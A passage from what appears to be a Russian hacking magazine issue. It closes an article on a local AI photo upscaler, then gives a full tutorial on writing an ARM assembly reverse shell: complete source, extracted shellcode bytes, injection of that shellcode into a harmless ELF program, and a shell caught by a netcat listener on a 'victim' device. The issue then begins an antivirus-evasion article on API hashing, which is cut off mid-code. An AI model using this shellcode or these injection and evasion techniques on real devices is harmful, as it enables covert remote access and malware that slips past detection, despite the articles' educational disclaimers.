 C:\> sfk.exe ftpserv -port= 21 -rw D:\F TP


В таком варианте использования сервер открывает полный доступ к каталогу
D:\FTP при вводе любого имени пользователя и пароля, поэтому после
передачи файлов его работу нужно завер шить комбинаци ей кла виш Ctrl + C.
   Кстати, не забудь перед переда чей фай лов переключить в настройках вир-
туальной машины сетевой адап тер из режима «NAT» в режим «Виртуальный
адаптер хос та».



ÎÁÐÀÁÎÒÊÀ ÔÎÒÎÃÐÀÔÈÉ

Итак, все ингредиенты собраны и смешаны, мож но прис тупать к вол шебству.
Не откладывая дела в долгий ящик, сразу выполним увеличе ние фотографии
с отсти рыванием и разглаживанием одеж ды при сутс твующих на ней пер-
сонажей, а заодно про рабо таем детали их лиц. В этом нам поможет Real-
ESRGAN, который сам обратится за допол нитель ными услу гами художника
к GFPGAN. Исходные фотог рафии (файлы в фор мате JPEG или PNG) помес-
тим в каталог ~/GAN/in, а результат пусть сохраняется в каталоге ~/GAN/out.
Обработ ка запускает ся следующим обра зом:


cd ~/GAN/Real-ESRGAN
python3.8 inference_realesrgan.py -i ../in -o ../out -t 64 --fp32
--face_enhance

В ходе ини циали зации «увеличителя» появится серия сообщений с пре дуп-
реждениями, а при небольшом объеме оперативной памяти  начнется
активный страничный обмен с фай лом подкачки. Но через минуту-другую
ситуация должна стабилизировать ся, а на экра не побегут поползут отсче ты
обработан ных бло ков:





  [W NNPACK.cpp:64] Could not initialize NNPACK! Reason: Unsupported
  hardware.


  Tile 1/42


  Tile 2/42


  ...


  Tile 41/42


  Tile 42/42



На предупрежде ние, что инициализировать NNPACK невозможно, не стоит
обращать вни мания, мы ведь зна ем, что у нас нет подходяще го гра фического
ускорите ля. На компьютере без Nvidia CUDA обра ботка одной фотографии
может затянуться на несколько десят ков минут. Но ведь работа ет!
  Вернемся к командной строке, запус кающей обработку. Первые два
парамет ра программы inference_realesrgan.py указывают на исходные
материалы и результат. С помощью парамет ра -t задается размер окна
обработ ки фраг мента изоб ражения. Если этого не сделать, то начала обра-
бот ки можно и не дождаться, потому что после длитель ного обме на с файлом
под качки программа сооб щит об ошиб ке. Еще один обязатель ный в спартан-
ских условиях параметр --fp32 заставля ет использовать 32-бит ные, а не 16-
битные данные, потому что под держка дан ных половинной длины на CPU
не реализована. Если его не ука зать, то появится сообщение об ошибке:



  Error "slow_conv2d_cpu" not implemented for 'Half'


Пос ледний параметр --face_enhance, как ты, наверное, догадал ся, при-
зывает Real-ESRGAN вос пользовать ся GFPGAN для улучшения проработки
обнаруженных на фотографиях лиц. Если хочешь, ты можешь обработать
фотог рафию только при ложением GFPGAN. Оно найдет на фотографии лица
людей, вырежет их отту да и попробует сделать более реалистичны ми. Коман-
дная строка в этом случае будет выг лядеть так:


cd ~/GAN/GFPGAN
python3.8 inference_gfpgan.py -i ../in -o ../out

В выходном каталоге, помимо файлов с улучшенными лицами, будут созданы
файлы, содер жащие рядом исходный материал и результат, чтобы можно
было наглядно оце нить про деланную программой работу.




                      Если  тебе  лень  набирать  команды  вручную,
                    можешь  взять  сце нарии  обо лочки  gfpgan.sh
                      и  resrgan.sh.  Помести  их  в  каталог ~/GAN
                      и используй так:

                     cd ~/GAN
                     /bin/sh gfpgan.sh in out
                     /bin/sh resrgan.sh in out



ÂÛÂÎÄÛ

Итак, мы пос троили настоящий локальный ней росетевой фотоуве личитель.
Он ни в коей мере не зависит от внешних сетевых ресурсов и может работать
на самом обыч ном компьюте ре. Программное обес печение Real-ESRGAN
и GFPGAN вмес те со средой исполнения Python 3.8 можно упаковать и сох-
ранить на тот слу чай, если понадо бится занять ся фотографи ями, а прогресс
вместе с биб лиоте ками Python ушел вперед и требует новых вычислительных
мощностей.
   Что можно сказать о результатах работы «фотоуве личителя»? Как ты сам
теперь можешь убе диться, качество выдаваемых им результатов в большинс-
тве случаев вызывает лишь удивление и восхищение. Но когда информации
недос таточ но (исходные материалы низ кого качества), нейронные сети
начинают додумывать отсутс тву ющие элемен ты, и это при водит к неожидан-
ным или даже шокирующим эффектам. В таких случаях спасти ситуацию
может предварительная ретушь исходного образца, выполненная традици-
онными методами в обычных графичес ких редак торах. Таким образом, новые
тех нологии удачно дополняют хорошо извес тные средства и расширя ют их
воз можности.
КОДИНГ





      ПИШЕМ НА АССЕМБЛЕРЕ
        СВОЙ РЕВЕРС-ШЕЛЛ
       ДЛЯ УСТРОЙСТВ НА ARM





Мно гие  знают,  как  соз дать  шелл-код
для обычных машин с архитек турой x86.
Про это написана куча мануалов, статей
и книг, но мно гие современные девай сы,
включая смартфо ны и роутеры, используют          PURGENTX                                                                                       Реверс-инженер
про цессоры ARM. Я собрал всю необ-      лаборатории инновационных                                                                                               технологий
ходимую информацию для под готовки стен-         и кибербезопасностиAP Security
да,  написания  и  инъ екции  шелл-кода
для устройств на ARM.




                     Все продемонстрирован ные методы при веде ны
                        в ознакомительных и учебных целях. Ни редак-
                         ция, ни автор статьи не несут ответственности
                        за практическое использование этих тех ник.


ARM (Advanced RISC Machine) — это 32-битная архи тектура, раз работанная
ком пани ей Acorn Computers Ltd в 1983 году. Про цессоры ARM име ют 32-раз-
рядные регис тры, но из них только 16 дос тупны прог раммисту. Этими 16 так
называемы ми видимы ми регистрами можно манипу лировать с помощью
набора инс трукций.
  Они делятся на регистры общего наз начения и специали зиро ванные.
К пер вым отно сятся регистры от R0 до R10, к спе циализированным — сле-
дующие:
 • R11 — frame pointer (FP);
 • R12 — intra-procedure (IP);
 • R13 — указатель на стек (stack pointer, SP);
 • R14 — связующий регистр (link register, LR);
 • R15 — счетчик (program counter, PC). Гру бо говоря, EIP/RIP.

Об ARM можно почитать на сайте, посвящен ном этим процессорам, или в
Википедии. Так же име ются пуб ликации об AArch64. Про ассем блер под ARM
советую следующие кни ги:
 • Ассемблер для Raspberry Pi. Практичес кое руководство;
 • Экс плуата ция систем ARM Linux;
 • Blue Fox: Arm Assembly Internals and Reverse Engineering.


ÑÎÇÄÀÍÈÅ ÂÈÐÒÓÀËÜÍÎÉ ÌÀØÈÍÛ Â QEMU

QEMU — это эмулятор раз личных про цес сорных архи тектур. Как правило, он
используется для эмуляции целого компь ютера (то есть для запуска вир-
туальной машины), однако для отладки одной программы это необязательно.
В Linux можно исполь зовать эму ляцию QEMU User-Mode, именно этот спо соб
и будет рассмотрен первым.
  Наша конеч ная цель — запус кать скомпилированные программы для ARM
64-bit. Для начала необходимо уста новить сам пакет эмулятора:


sudo apt-get update
sudo apt-get install qemu qemu-user qemu-user-static

Для AArch64 уста навливаем следующие компоненты:


sudo apt install gcc-arm-linux-gnueabihf binutils-arm-linux-
gnueabihf binutils-arm-linux-gnueabihf-dbg
sudo apt install gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu
binutils-aarch64-linux-gnu-dbg

Что бы эмулиро вать процессор типа ARM64, необ ходимо создать две дирек-
тории — deb11_inst и deb11_start: mkdir  deb11_inst  deb11_start.
Затем перейти в deb11_inst и скачать два фай ла — installer-linux
и installer-initrd.gz.
  Для это го используем следующие команды:


wget -O installer-linux http://http.us.debian.org/debian/dists/
bullseye/main/installer-arm64/current/images/netboot/debian-
installer/arm64/linux


wget -O installer-initrd.gz http://http.us.debian.org/debian/dists/
bullseye/main/installer-arm64/current/images/netboot/debian-
installer/arm64/initrd.gz

Дальше создаем диск для уста новки на него системы:


qemu-img create -f raw hda.img 20G

Создаем файл instDebARM64.sh, в него необ ходимо записать следующий
скрипт:


#!/bin/bash
qemu-system-aarch64 -M virt -m 2G -cpu cortex-a53 -smp 2 \
-kernel installer-linux \
-initrd installer-initrd.gz \
-drive if=none,file=hda.img,format=raw,id= hd \
-device virtio-blk-pci,drive= hd \
-netdev user,id=mynet \
-device virtio-net-pci,netdev=mynet \
-display gtk,gl= on \
-device virtio-gpu-pci \
-no-reboot \
-device qemu-xhci -device usb-kbd -device usb-tablet

Здесь
 • qemu-system-aarch64 — эму ляция пол ной системы для архи тектуры;
 • -M — выбор эмулируемой машины;
 • -m — объем ОЗУ;
 • -cpu — тип эмулируемого процес сора;
 • -smp — количество виртуальных ядер ЦП и их распределение по сокетам;
 • -kernel — для исполь зования указан ного обра за ядра Linux;
 • -initrd — для загрузки Linux;
 • netdev/device и drive — описание сетевой карты и виртуальных дис-
   ков;
 • if — опция указывает, через интерфейс какого типа под ключен диск;
 • file — опре деля ет, какой образ использовать для какого диска;
 • format — указывает явным образ фор мат дисков, не использовать авто-
   определение;
 • -display — выбор типа отображения, доступно sdl, curses, gtk, none,
  vga;
 • -no-reboot — отмена перезагрузки.

Сохраняем и запускаем скрипт. Начнется классичес кая уста новка Debian 11.
На первом экране надо выбрать англий ский язык в качес тве основного.





Далее необходимо выбрать UNITED STATES. Ближе к завершению установки
появится ошиб ка.





Выбираем Continue и дожидаемся окон чания установки Debian. Переносим
образ hda.img с уста нов ленной системой в директорию deb11_start. Затем
создаем файл debARM64.sh, в который поместим сле дующий скрипт:


#!/bin/bash
qemu-system-aarch64 -M virt -m 3G -cpu cortex-a53 -smp 2 \
-kernel vmlinuz-5.10.0-8-arm64 \
-initrd initrd.img-5.10.0-8-arm64 \
-append 'root=/dev/vda2' \
-drive if=none,file=hda.img,format=raw,id= hd \
-device virtio-blk-pci,drive= hd \
-netdev user,id=mynet \
-device virtio-net-pci,netdev=mynet \
-display gtk,gl= on \
-device virtio-gpu \
-no-reboot \
-device qemu-xhci -device usb-kbd -device usb-tablet\

Щел каем на созданном диске hda.img правой клавишей мыши и монтируем
его: «Открыть с помощью → Монтирование дискового образа». На смон-
тированном дис ке нас интересуют два файла: initrd.img-5.10.0-20-arm64
и vmlinuz-5.10.0-20-arm64 (ну а в общем случае initrd.img-xxxxxxx-
arm64 и vmlinuz-xxxxxxx-arm64). Версии системы должны быть оди нако-
выми! Запускаем файл debARM64.sh:


./debARM64





Для настройки сети в скрипт debARM64.sh нужно добавить строч ку -net
user,hostfwd=tcp::10022-:22. Эта строч ка создаст еще и SSH-подклю-
чение.


Docker
Есть и альтер нативный вариант: эму ляция Raspberry Pi с использованием
Docker. Для этого нужно установить Docker:


sudo apt-get install docker.io

Затем скачать соответствующий образ:


docker pull lukechilds/dockerpi

Как толь ко все прогрузится, вводим команду


docker run -it --name имя_для_контейнера -v $HOME/.dockerpi:/sdcard
lukechilds/dockerpi

В качестве имя_для_контейнера можно выб рать любое, я назову свой
ap_security. После этого начнется рас паковка и запуск Raspberry Pi.





Итогом успешно го запус ка будет такое окно.





Учетные данные для входа в сис тему стан дартны: pi:raspberry. Собс твенно,
всё. Теперь в нашей виртуальной лаборатории есть Raspberry Pi. Чтобы вык-
лючить устройство, исполь зуй команду sudo poweroff, а чтобы запустить —
docker start -ai имя_для_контейнера, где имя_для_контейнера — выб-
ранное тобой имя контей нера.


Óñòàíîâêà GDB è PEDA/GEF
Установка GDB и пла гина PEDA довольно прос та. Для GDB исполь зуем
коман ду


sudo apt install gdb

Для установки PEDA команды такие:


git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit





GEF установим командой


bash -c "$(curl -fsSL https://gef.blah.cat/sh)"





Отладку я буду выпол нять в основном в GEF.


ÏÐÎÁÓÅÌ GDB È ÏÈØÅÌ ÏÅÐÂÓÞ ÏÐÎÃÐÀÌÌÓ

Что бы написать программу на ассемблере, потребуются три инстру мента:
 • тексто вый редак тор — nano;
 • программа для соз дания объектного файла — as;
 • программа для динами ческой при вязки — ld.

Тексто вый редак тор — это вкусовщина. Многие пишут в Vim, мне удобнее
в nano, поэтому код я буду писать там. Программа as соз дает объектный
файл, а ld выполняет динами ческую при вязку. Работать с этими программами
нуж но сле дующим образом:
 1. Пишем команду as source.asm -o source.o , которая создает объ-
   ектный файл с наз вани ем source.o .
 2. Связываем объектный файл и преобра зуем его в исполня емый с помощью
   команды ld source.o -o source.bin.

У любого файла с кодом на языке ассемблера должна быть точка, с которой
начинается программа. Она выглядит так:


_start:

Эта точ ка опре деляется как глобальное имя для всей программы. Каждый
оператор име ет сле дующий синтаксис:


<обозначение:> <инструкция> @ комментарий


Ïåðâàÿ ïðîãðàììà
В первой программе, по классике, реализован вывод приветс твенной строч-
ки — H3ll0, ][akep!:


.global _start


_start:
    mov r7, #4      @ номер системного вызова
    mov r0, #1      @ вывод - stdout
    mov r2, #13     @ длина строки
    ldr r1, =string @ строка находится на метке string
    swi 0           @ системный вызов


    mov r7, #1      @ выход
    swi 0


.data
string:
.ascii "H3ll0, ][akep!\n"

Здесь
 • r7 — номер про цедуры;
 • r0 определя ет поток (stdin/stdout/stderr);
 • r2 — количество выводимых символов;
 • r1 хранит адрес стро ки.

Все это схоже с ассембле ром для i386. В ARM регис тры для взаимодей ствия
такие:
 • r7 — номер системно го вызова;
 • r0 — аргу мент 1;
 • r1 — аргу мент 2;
 • r2 — аргу мент 3;
 • r3 — аргу мент 4;
 • r4 — аргу мент 5;
 • r5 — аргу мент 6;
 • r0 — возвращаемое значение или код ошиб ки.

Информация обо всех системных вызовах  есть в справке программы
J0llyTr0LLz. Там же описано, что именно дол жно лежать в регис трах. Скачать
программу и узнать, как с ней работать, мож но на GitHub.





Компилируем при ложе ние и запускаем.


as -g proga1.asm -o proga1.o
ld proga1.o -o proga1.bin

Здесь -g — ключ для включения отладочной информации. Пос ле запуска уви-
дим сле дующее:



  $ file proga1.bin
  proga1.bin: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV),
  statically linked, not stripped
  ./proga1.bin
  H3ll0, ][akep!


Попробуем продеба жить это приложение.


                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ




           ПИШЕМ НА АССЕМБЛЕРЕ СВОЙ РЕВЕРС-
                                  ШЕЛЛ
                        ДЛЯ УСТРОЙСТВ НА ARM





ÏÅÐÂÛÉ ÎÏÛÒ Â ÎÒËÀÄÊÅ

Запускаем GDB и заг ружаем в него бинар ный файл, пос ле чего переходим
к разделу start:



  $ gdb
 gef➤  file proga1.bin
  Reading symbols from proga1.bin...done.
 gef➤  disassemble _start
  Dump of assembler code for function _start:
     0x00010074 <+0>: mov r7, #4
     0x00010078 <+4>: mov r0, #1
     0x0001007c <+8>: mov r2, #19
     0x00010080 <+12>:    ldr r1, [pc, #8]    ; 0x10090 <_start+28>
     0x00010084 <+16>:    svc 0x00000000
     0x00010088 <+20>:    mov r7, #1
     0x0001008c <+24>:    svc 0x00000000
     0x00010090 <+28>:    muleq   r2, r4, r0
  End of assembler dump.


Пос тавим точ ку останова на первой инс трукции и запустим программу:



  b *_start
  r


Ок но отладки GDB-GEF выг лядит так.





Шпаргалку по GDB-командам мож но най ти в до кументации, опубликованной
на сай те Darkdust.
  На пер вом шаге все обнулено:


$r0  : 0x0
$r1  : 0x0
$r2  : 0x0
$r3  : 0x0
$r4  : 0x0
$r5  : 0x0
$r6  : 0x0
$r7  : 0x0
$r8  : 0x0
$r9  : 0x0
$r10 : 0x0
$r11 : 0x0
$r12 : 0x0
$sp  : 0xbefffce0  →  0x00000001
$lr  : 0x0
$pc  : 0x00010074  →  <_start+0> mov r7,  #4
$cpsr: [negative zero carry overflow interrupt fast thumb]

С исполь зовани ем команды ni перейдем сразу к системному вызову. Если
пос ле команды, которую мы вве ли, нажать Enter, то команда выпол нится пов-
торно.
  Смот рим, что у нас в регистрах:


$r0  : 0x1
$r1  : 0x00020094  →  <string+0> stclvs 3,  cr3,  [r12],  #-288   ;
0xfffffee0
$r2  : 0x13
$r3  : 0x0
$r4  : 0x0
$r5  : 0x0
$r6  : 0x0
$r7  : 0x4
$r8  : 0x0
$r9  : 0x0
$r10 : 0x0
$r11 : 0x0
$r12 : 0x0
$sp  : 0xbefffce0  →  0x00000001
$lr  : 0x0
$pc  : 0x00010084  →  <_start+16> svc 0x00000000
$cpsr: [negative zero carry overflow interrupt fast thumb]

Как можно заметить, вез де лежат нужные нам значения. Пос мотрим, что хра-
нится в регистре r1.


 gef➤  x/s 0x00020094
  0x20094:    "H3ll0, ][akep!\nA\021"


Пройдем дальше и най дем вывод сообщения:


 gef➤ n
  H3ll0, ][akep!


Отлично! Сооб щение вывелось. Настало вре мя боевой практики.


ÏÈØÅÌ ÐÅÂÅÐÑ-ØÅËË

Для написания реверс-шелла нам понадо бятся сле дующие сис темные
вызовы:
 • socket — для создания сер вера;
 • connect — для под клю чения к жертве;
 • dup2 — для копирования stdin/stdout/stderr;
 • execve — для запуска /bin/sh .

В общем, ничего необычного, все стан дартно. Необходимые системные
вызовы я буду под смат ривать в программе J0llyTr0LLz.





Для socket(PF_INET, SOCK_STREAM, 0) = socket(2, 1, 0):
 1. В регистре r7 будет лежать значение 0x119.
 2. В регистре r0 значение 2, потому что мы используем PF_INET, семей ство
   протоколов IP.
 3. В регистре r1 находится 1 — SOCK_STREAM(TCP).

Первая часть кода получится такой:


.global _start


_start:


    mov r0, #2
    mov r1, #1
    sub r2, r2
    mov r7, #200
    add r7, #81
    swi 0 @ socket(2, 1, 0)


    mov r4, r0

В регистр r0 будет сохранен сокет-дескрип тор. Для его сохранения просто
передадим его в какой-нибудь дру гой регистр, что бы потом снова им вос-
поль зоваться. Я выбрал регистр r4.
   Те перь нуж но описать функцию connect(sockid,  sockaddr  *addr,
addrlen). С помощью J0llyTr0LLz определяем номер системного вызова:
 • r7 = 0x11b;
 • r0 = sockid = r4 ;
 • r1 = &sockaddr;
 • r2 = 16 .

Здесь sockaddr — структура, в которой будет содержаться порт, IP-адрес
и исполь зуемый про токол. В нашем случае это TCP.


struct:
.ascii "\x02\xff" @ AF_INET
.ascii "\x11\x5c" @ port = 4444
.byte xxx,xxx,xxx,xxx @ IP address

В ито ге получаем такой фраг мент кода:


    mov r4, r0
    adr r1, struct
    mov r2, #16  @ struct length
    add r7, #2   @ 281 + 2
    swi 0


struct:
.ascii "\x02\xff" @ AF_INET
.ascii "\x11\x5c" @ port = 4444
.byte xxx,xxx,xxx,xxx @ IP address


Ко ман да adr получает какой-либо адрес, в ассем бле ре i386 есть аналогич-
ная инструкция lea.
  Дли на считает ся так: 2 байта — порт, 2 байта — AF_INET, 4 байта — IP-
адрес и 8 байт — паддинг. Поэто му в регистр r2 будет положено число 16.
Регистр r7 никак не изменился с момента пос леднего вызова, поэтому мы
прос то прибавляем 2.
  Далее  сле дует  конс трукция  dup2(sockid,  stdin/stdout/stderr).
Номер системного вызова dup2() равен 0x3f. Зна чение sockid хранится
в регистре r4, stdin/stdout/stderr рав ны 0/1/2 соответственно. Получаем
следующее:
 • r7 = 0x3f;
 • r0 = r4 ;
 • r1 = 0/1/2 .

Ре ализация этого шага будет выг лядеть таким обра зом:


@ dup2(sockid , 0)
mov r0, r4 @ sockid
sub r1, r1 @ 0 - stdin
sub r7, r7
mov r7, #0x3f @ dup2
swi 0


@ dup2(sockid , 1)
mov r0, r4 @ sockid
add r1, #1 @ 1 - stdout
swi 0


@ dup2(sockid, 2)
mov r0, r4 @ sockid
add r1, #1 @ 2 - stderr
swi 0

Пос ледний шаг: получа ем шелл. Тут, в принципе, клас сика: execve("/bin/
sh", 0, 0). В сек ции дан ных про пишем следующую строку:


binsh:
.ascii "/bin/sh"

В r0 будет находиться строка /bin/sh, r1 и r2 — нулевые, а в r7 — значение
11. Таким образом, код при мет сле дующий вид:


 adr   r0, binsh
 sub   r2, r2
 sub   r1, r1
 mov   r7, #11
 svc   0

В ито ге полный код выглядит так:


.global _start


_start:


    mov r0, #2
    mov r1, #1
    sub r2, r2
    mov r7, #200
    add r7, #81
    swi 0 @ socket(2, 1, 0)


    mov r4, r0
    adr r1, struct
    mov r2, #16  @ struct length
    add r7, #2   @ 281 + 2
    swi 0


    @ dup2(sockid , 0)
    mov r0, r4 @ sockid
    sub r1, r1 @ 0 - stdin
    sub r7, r7
    mov r7, #0x3f @ dup2
    swi 0


    @ dup2(sockid , 1)
    mov r0, r4 @ sockid
    add r1, #1 @ 1 - stdout
    swi 0


    @ dup2(sockid, 2)
    mov r0, r4 @ sockid
    add r1, #1 @ 2 - stderr
    swi 0


     adr   r0, binsh
     sub   r2, r2
     sub   r1, r1
     mov   r7, #11
     svc   0


struct:
.ascii "\x02\xff" @ AF_INET
.ascii "\x11\x5c" @ port = 4444
.byte xxx,xxx,xxx,xxx @ IP address


binsh:
.ascii "/bin/sh"

Компилируем и про веряем на каком-нибудь таргете. На стороне хакера
откры ваем TCP-подклю чение:



  $ nc -lvnp 444
  Listening on 0.0.0.0 4444


Компилируем и запускаем приложение у жертвы:


as rs.asm -o rs.o
ld rs.o -o rs.bin
./rs.bin

На сто роне хакера видим следующее:



  Connection received on xxx.xxx.xxx.xxx xxxxx
  $ whoami
  whoami
  pi



ÈÍÚÅÊÖÈß ØÅËË-ÊÎÄÀ

Пос ле инъекции шелл-кода можно считать, что мы создали пол ноценную мал-
варь. Для получения бай тов шелл-кода спарсим бинарь:


objcopy -O binary rs.bin rs_bytes.bin

Этой командой мы вытащим основную часть бинаря, то есть сам шелл-код:



  $ xxd rs_bytes.bin
  00000000: 0200 a0e3 0110 a0e3 0220 42e0 c870 a0e3  ......... B..p..
  00000010: 5170 87e2 0100 00ef 0040 a0e1 3410 8fe2  Qp.......@..4...
  00000020: 1020 a0e3 0270 87e2 0100 00ef 0400 a0e1  . ...p..........
  00000030: 0110 41e0 0770 47e0 3f70 a0e3 0000 00ef  ..A..pG.?p......
  00000040: 0400 a0e1 0110 81e2 0000 00ef 0400 a0e1  ................
  00000050: 0110 81e2 0000 00ef 02ff 115c 0a21 4507  ............!E.


Затем выполним инъекцию при помощи прог раммы KillerQueen, описание
работы программы ты най дешь на ее стра нице на GitHub.
  На стороне пользователя мы задей ствуем незамысловатую программу:


#include <stdio.h>


int main()
{
    puts("Hello, ][akep!");
    return 0;
}

Ском пилирую ее в Raspberry Pi:



  $ gcc hello_xakep.c -o hello_xakep.bin -no-pie
  $ file hello_xakep.bin
  hello_xaker.bin: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV),
  dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux
  3.2.0, BuildID[sha1]=1d0e0528aa357a184a069a0ef77b138b89fed21b, not
  stripped


Запускаем KillerQueen и встав ляем туда сам шелл-код:


0200 a0e3 0110 a0e3 0220 42e0 c870 a0e3 5170 87e2 0100 00ef 0040
a0e1 3410 8fe21020 a0e3 0270 87e2 0100 00ef 0400 a0e10110 41e0 0770
47e0 3f70 a0e3 0000 00ef 0400 a0e1 0110 81e2 0000 00ef 0400 a0e1
0110 81e2 0000 00ef 02ff 115c 0a21 4507





Далее заг ружаем в нее подставную программу hello_xakep.bin.





Логи подтверждают, что прога заг ружена.





Выбираем Tools → ELFInject. Пос ле этого у программы появится новая точка
входа, а мы уви дим сооб щение, что шелл-код инъектирован.





Пос мотрим, как это выг лядит в IDA Pro.





Как можно заметить, здесь теперь расположена новая сек ция start, и прог-
рамма первым делом зайдет именно в нее. А там лежит реверс-шелл.





Запускаем зараженную программу на устройстве жертвы. Хакер тем вре-
менем открыл подклю чение и получил доступ к командной оболочке:


./hello_xaker.bin



  $ nc -lvnp 4444
  Connection received on xxx.xxx.xxx.xxx xxxxx
  $ whoami
  whoami
  pi



ÂÛÂÎÄÛ

Мы узнали, как написать свой реверс-шелл для устройства на базе ARM.
Иссле дования в области безопасности ARM-сис тем очень актуальны, осо-
бенно из-за того, что устройств на базе этих процес соров появляется все
боль ше и боль ше. Безусловно, опи сан ный в статье эксперимент довольно
прост, но, как говорили древние мудрецы, дол гий путь начинается с одного
шага.
КОДИНГ





     РЕАЛИЗУЕМ ТЕХНИКУ
       API HASHING, ЧТОБЫ
    ОБДУРИТЬ АНТИВИРУС





В этой статье мы с тобой напишем пол-
ноценную пермутирующую реализацию тех-
ники API Hashing, что позволит раз и нав-
сегда скрыть импорты от глаз антивируса.
Впервые  тех нику  API  Hashing  я  увидел         MichelleVermishelle                                                                                       @Michaelzhm
в вирусе-шифровальщике Revil, проблема        michael.zhmailo@yandex.ru
лишь в том, что хеши от функций были впи-
саны в код, а это позволяет легко создавать
сиг натуры. Давай сде лаем так, чтобы все
дан ные  генери ровались  на  лету,  тог да
у антивиру са не будет шансов!




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.


В прош лой статье я рассмотрел вари анты сокрытия IAT путем получения
адресов  функции  и  их  вызова  «напрямую»  через  LoadLibrary()
и GetProcAddress(), но проб лема в том, что сами стро ки, содержащие име-
на функций, никак не спрятаны. Поэто му любой ува жающий себя антивирус-
ный продукт все рав но смо жет понять, что мы задумали.





                     Никакой скрытности





                  Всем понятно, что вызыва ется

Что бы предот вратить это, добрые хакеры придума ли технику API Hashing,
с которой сей час и познакомим ся.


ÏÐÎÑÒÅÉØÈÉ API HASHING

Раньше  мы   получали  адрес  нужной  фун кции   через   кастомный
GetProcAddress(). Вот как это выг лядит.


FARPROC myGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule
+ dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (
PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
    ntHeaders->OptionalHeader.DataDirectory[
IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule +
exportDirectory->AddressOfFunctions);
    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule +
exportDirectory->AddressOfNameOrdinals);
    DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory
->AddressOfNames);
    for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
        if (strcmp(lpProcName, (const char*)hModule + addressOfNames[
i]) == 0) {
            return (FARPROC)((BYTE*)hModule + addressOfFunctions[
addressOfNameOrdinals[i]]);
        }
    }
    return NULL;
}

API Hashing заключается в том, что мы вместо име ни функции (lpProcName)
будем передавать хеш от нее. Фактичес ки изменится лишь следующая стро-
ка.


if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0
)

И ста нет вот такой:


if (strcmp(lpProcName, HASH((const char*)hModule + addressOfNames[i])
) == 0)

Аналогичным образом все происходит и с GetModuleHandle().
  Но что это вообще за хеш, откуда его взять? Хеш генерируется с помощью
конкретного алгоритма хеширования, можешь выб рать любой на свой вкус.
При веду несколь ко примеров.


ÂÛÁÎÐ ÀËÃÎÐÈÒÌÀ

Итак, берем алгоритм Djb2. Это очень быс трый алгоритм хеширования.


hash = ((hash << 5) + hash) + c

 • hash — текущее зна чение хеша;
 • << — сдвиг вправо;
 • c — текущее зна чение символа в стро ке.

Вот функция, которая позволяет хешировать строку.


#include <Windows.h>
#include <iostream>


#define INITIAL_HASH    3731 // Для рандомизации
#define INITIAL_SEED    7


// ASCII
DWORD HashStringDjb2A(_In_ PCHAR String)
{
    ULONG Hash = INITIAL_HASH;
    INT c;
    while (c = *String++)
        Hash = ((Hash << INITIAL_SEED) + Hash) + c;
    return Hash;
}


// Unicode
DWORD HashStringDjb2W(_In_ PWCHAR String)
{
    ULONG Hash = INITIAL_HASH;
    INT c;


    while (c = *String++)
        Hash = ((Hash << INITIAL_SEED) + Hash) + c;
    return Hash;
}


int main() {
    LPWSTR str = (LPWSTR)L"HelloWorld";
    std::cout << HashStringDjb2W(str);
    return 0;
}

Те перь давай попробуем алгоритм JenkinsOneAtATime32Bit. Он перебирает
символы входной строки и постепенно обновляет хеш-значение в соответс-
твии с каж дым полученным символом.


hash += c;
hash += (hash << 10);
hash ^= (hash >> 6);

 • hash — текущее зна чение хеша;
 • c — текущее зна чение символа в стро ке.

Код с функцией.


#include <Windows.h>
#include <iostream>


#define INITIAL_SEED    7


// ASCII
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenA(String);


    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash << INITIAL_SEED;
        Hash ^= Hash >> 6;
    }
    Hash += Hash << 3;
    Hash ^= Hash >> 11;
    Hash += Hash << 15;
    return Hash;
}


// Unicode
UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenW(String);


    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash << INITIAL_SEED;
        Hash ^= Hash >> 6;
    }


    Hash += Hash << 3;
    Hash ^= Hash >> 11;
    Hash += Hash << 15;


    return Hash;
}
int main() {
    LPWSTR str = (LPWSTR)L"HelloWorld";
    std::cout << HashStringJenkinsOneAtATime32BitW(str);
    return 0;
}

Не утомился? Давай пос мотрим еще один при мер. В каком-то проекте, чуть
ли не в Hell’s Gate, я встречал алго ритм LoseLose. Он вычисляет хеш-зна-
чение входной строки, перебирая каждый сим вол в ней и суммируя значения
ASCII каж дого символа.


hash = 0;
hash += c; // Для каждого символа в строке

Хеш-значение, получен ное в результате алгоритма LoseLose, представ ляет
собой целое число, уни кальное для входной стро ки. Но все равно есть веро-
ятность коллизии. Чтобы решить эту проблему, формула алгорит ма была
обновле на, как показано ниже.


hash = 0;
hash += c;
hash *= c + 2;

Вот пример функции, которая генерирует подоб ный хеш.


#include <Windows.h>
#include <iostream>
#define INITIAL_SEED 2


// ASCII
DWORD HashStringLoseLoseA(_In_ PCHAR String)
{
    ULONG Hash = 0;
    INT c;
    while (c = *String++) {
